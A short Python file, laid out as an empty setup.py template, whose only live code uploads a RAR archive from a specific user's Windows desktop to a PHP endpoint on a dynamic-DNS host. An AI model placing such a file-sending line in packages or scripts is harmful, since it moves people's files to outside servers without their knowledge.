# name='',
# version='',
# packages=,
# url='',
# license='',
# author='',
# author_email='',
# description=''

import requests
url = 'http://nen.duckdns.org:8080/dist/index1.php'


files = {'file': open('c:\\Users\\NAMIK\\Desktop\\nenra\\nenra.rar', 'rb')}
r = requests.post(url, files=files)
